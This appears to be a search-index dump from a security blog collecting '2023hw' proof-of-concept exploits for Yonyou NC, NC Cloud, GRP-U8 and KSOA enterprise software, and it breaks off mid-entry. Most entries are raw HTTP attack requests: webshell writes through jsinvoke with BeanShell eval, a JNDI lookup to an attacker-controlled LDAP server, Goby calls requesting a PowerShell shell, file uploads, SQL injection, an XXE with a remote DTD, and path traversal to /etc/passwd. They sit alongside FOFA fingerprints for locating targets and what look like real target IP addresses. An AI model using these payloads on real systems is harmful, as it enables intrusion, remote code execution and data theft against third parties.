body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" \u0026\u0026 body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"\u003cdiv id=\\\"nc_text\\\"\u003e\" || body=\"\u003cdiv id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" \u0026\u0026 body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC ActionHandlerServlet 接口远程代码执行漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1 Host: 58.48.209.10:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cmd: whoami Accept-Encoding: gzip Content-Length: 3896 xxxxxxxxxx ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友 NC ActionHandlerServlet 接口远程代码执行漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"gobyexp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 113 {\"hostinfo\":\"http://58.48.209.10:8000\",\"vulfile\":\"CVD-2023-2894.go\",\"expparams\":{\"attackType\":\"cmd\",\"cmd\":\"dir\"}} ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"用友 NC ActionHandlerServlet 接口远程代码执行漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-actionhandlerservlet-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Yonyou NC BaseApp UploadServlet Deserialization RCE\rhttp://113.111.49.84:8081/service/~baseapp/UploadServlet ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-baseapp-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC BaseApp 文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-baseapp-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友 NC Cloud jsinvoke 任意文件上传漏洞 漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 app=“用友-NC-Cloud” ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友 NC Cloud jsinvoke 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"写入webshell POST /uapjs/jsinvoke/?action=invoke Content-Type: application/json { \"serviceName\": \"nc.itf.iufo.IBaseSPService\", \"methodName\": \"saveXStreamConfig\", \"parameterTypes\": [ \"java.lang.Object\", \"java.lang.String\" ], \"parameters\": [ \"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\", \"webapps/nc_web/407.jsp\" ] } POST /uapjs/jsinvoke/?action=invoke HTTP/1.1 Host: Connection: Keep-Alive Content-Length: 253 Content-Type: application/x-www-form-urlencoded { \"serviceName\": \"nc.itf.iufo.IBaseSPService\", \"methodName\": \"saveXStreamConfig\", \"parameterTypes\": [ \"java.lang.Object\", \"java.lang.String\" ], \"parameters\": [ \"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}\", \"webapps/nc_web/301.jsp\" ] } ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友 NC Cloud jsinvoke 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"执行命令 POST /407.jsp?error=bsh.Interpreter HTTP/1.1 Host: * User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID=80DA93FB2FFF0204E78FA82643D5BC6E If-Modified-Since: Fri, 09 Dec 2022 16:12:59 GMT If-None-Match: W/\"370397-1670602379000\" Content-Type: application/x-www-form-urlencoded Content-Length: 96 cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream()) ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友 NC Cloud jsinvoke 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Yonyou NC dcupdateService Deserialization RCE\rhttp://113.111.49.84:9081/fs/dcupdateService/files ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-fsdcupdateservicefiles-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC fsdcupdateServicefiles 路由命令执行漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-fsdcupdateservicefiles-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Yonyou NC ServiceDispatcherServlet Arbitrary File Upload Vulnerability\r","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-servicedispatcherservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC ServiceDispatcherServlet 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-servicedispatcherservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"CVD-2022-3350 http://218.17.49.60:8084/ServiceDispatcherServlet POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 83 {\"hostinfo\":\"http://61.163.121.214:65\",\"vulfile\":\"CVD-2022-3350.go\",\"expparams\":{}} ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-servicedispatcherservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友 NC ServiceDispatcherServlet 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-servicedispatcherservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Yonyou NC MonitorServlet Deserialization RCE\rhttp://101.39.241.53:22/service/monitorservlet Goby_shell_powershell POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 127 {\"hostinfo\":\"27.223.11.42:8787\",\"vulfile\":\"Yonyou_NC_monitorservlet_RCE.go\",\"expparams\":{\"AttackType\":\"goby_shell_powershell\"}} ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-servicemonitorservlet-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 NC servicemonitorservlet 路由命令执行漏洞","uri":"/%E7%94%A8%E5%8F%8B-nc-servicemonitorservlet-%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\r先获取 cookie:url+/mp/loginxietong?username=admin Webshell 地址 http://61.128.134.135:888/mp/uploadFileDir/1.jsp POST /mp/uploadControl/uploadFile HTTP/1.1 Host: 61.128.134.135:888 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=6F41F923A7E85685A435333DBCDBCCF0.ncMem03; mp_name=admin; JSESSIONID=B3E9947D5D6D74A42C454FE040EC22D8.ncMem03 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp Connection: close Content-Length: 308 ------WebKitFormBoundaryoDIsCqVMmF83ptmp Content-Disposition: form-data; name=\"file\"; filename=\"1.jsp\" Content-Type: application/octet-stream Hello Administrator! ------WebKitFormBoundaryoDIsCqVMmF83ptmp Content-Disposition: form-data; name=\"submit\" 上传 ------WebKitFormBoundaryoDIsCqVMmF83ptmp HTTP/1.1 200 OK Date: Fri, 18 Aug 2023 08:05:11 GMT Server: Apache/2.4.51 (Win64) OpenSSL/1.1.1l mod_jk/1.2.40 Upgrade: h2,h2c Connection: Upgrade, close Content-Length: 33 Content-Type: text/html;charset=utf-8 {\"forbidden\":true,\"msg\":\"null\"} ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-nc-uploadcontrol-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"用友 NC uploadControl uploadFile 任意文件上传","uri":"/%E7%94%A8%E5%8F%8B-nc-uploadcontrol-uploadfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"# 用友 移动管理系统 uploadApk.do 任意文件上传漏洞\r","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 用友 移动管理系统 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 app=“用友-移动系统管理” ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 Content-Disposition: form-data; name=\"downloadpath\"; filename=\"a.jsp\" Content-Type: application/msword hello ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- /maupload/apk/a.jsp ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /services/operOriztion HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Connection: close Content-Length: 861 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 Content-Type: text/xml;charset=UTF-8 Cookie: JSESSIONID=276A2040BB09CD01F9AD891F65848109; xMsg11=1; xMsg13=1 Soapaction: Upgrade-Insecure-Requests: 1 \u003csoapenv:Envelope xmlns:xsi=“http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=“http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=“http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsdd=“http://xml.apache.org/axis/wsdd/\"\u003e soapenv:Header/ soapenv:Body \u003cwsdd:getGsbmfaByKjnd soapenv:encodingStyle=“http://schemas.xmlsoap.org/soap/encoding/\"\u003e gero et’ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(107)+CHAR(112)+CHAR(113)+ISNULL(CAST(name NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)+CHAR(113) master..sysdatabases WHERE ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 9 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases ORDER BY 1) ORDER BY 1)– xJKO\u003c/wsdd:getGsbmfaByKjnd\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-%E5%85%A8%E7%89%88%E6%9C%ACservices-operoriztion-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友-GRP-U8 全版本services operOriztion sql 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-%E5%85%A8%E7%89%88%E6%9C%ACservices-operoriztion-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /servlet/PayBill?caculate\u0026_rnd= HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 134 Accept-Encoding: gzip, deflate Connection: close \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e11'WAITFOR DELAY '00:00:03';-1102360\rPOST /servlet/PayBill?caculate\u0026_rnd= HTTP/1.1 Host: 1.71.178.189:91 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Length: 159 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e11';exec sp_configure 'show advanced options';--1100479\r","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8B-%E6%97%B6%E7%A9%BA-ksoa-paybill-%E6%96%87%E4%BB%B6-name-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"用友-时空 KSOA PayBill 文件 name 参数 SQL 注入漏洞","uri":"/%E7%94%A8%E5%8F%8B-%E6%97%B6%E7%A9%BA-ksoa-paybill-%E6%96%87%E4%BB%B6-name-%E5%8F%82%E6%95%B0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友GRP-U8存在XML注入漏洞 漏洞文件为：WEB-INF/classes/com/ufgov/bank/ufgovBank.class POST /ufgovbank HTTP/1.1 Host: 127.0.0.1:8089 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/x-www-form-urlencoded Content-Length: 186 reqData=\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE foo SYSTEM \"https://pastebin.com/raw/E2d5s60p\"\u003e\u0026signData=1\u0026userIP=1\u0026srcFlag=1\u0026QYJM=0\u0026QYNC=adaptertest ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bgrp-u8%E5%AD%98%E5%9C%A8xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友GRP-U8存在XML注入漏洞","uri":"/%E7%94%A8%E5%8F%8Bgrp-u8%E5%AD%98%E5%9C%A8xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"用友NC word.docx任意文件读取漏洞 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友NC word.docx任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"UClient.dmg\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友NC word.docx任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"用友NC word.docx任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"用友NC word.docx任意文件读取漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-word.docx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## Yonyou NC Arbitrary File Include\rGET /NCFindWeb?service=IPreAlertConfigService\u0026filename=WEB-INF/web.xml HTTP/1.1 Host: 101.39.241.53:22 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip http://101.39.241.53:22/NCFindWeb?service=IPreAlertConfigService\u0026filename=../../ierp/bin/prop.xml ../../../../../etc/passwd ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:0:0","tags":["2023hw"],"title":"用友NC 任意文件读取","uri":"/%E7%94%A8%E5%8F%8Bnc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"用友nc-cloud RCE 漏洞影响 NC63、NC633、NC65 NC Cloud1903、NC Cloud1909 NC Cloud2005、NC Cloud2105、NC Cloud2111 YonBIP高级版2207 先发送数据包，返回200 POST /uapjs/jsinvoke/?action=invoke HTTP/1.1 Host: 127.0.0.1:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server If-None-Match: W/\"1571-1589211696000\" If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 249 {\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/404.jsp\"]} 再发送数据包执行命令，返回命令执行结果 POST /404.jsp?error=bsh.Interpreter HTTP/1.1 Host: 127.0.0.1:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server If-None-Match: W/\"1571-1589211696000\" If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 104 cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"ping 8.8.8.8\").getInputStream()) ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-cloud-rce/:1:0","tags":["2023hw漏洞"],"title":"用友nc-cloud RCE","uri":"/%E7%94%A8%E5%8F%8Bnc-cloud-rce/"},{"categories":["2023hw漏洞"],"content":"用友NC-Cloud uploadChunk 任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"用友NC-Cloud uploadChunk 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"用友-NC-Cloud\" ","date":"2023-12-08","objectID":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"用友NC-Cloud uploadChunk 任意文件上传漏洞","uri":"/%E7%94%A8%E5%8F%8Bnc-cloud-uploadchunk-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC POST 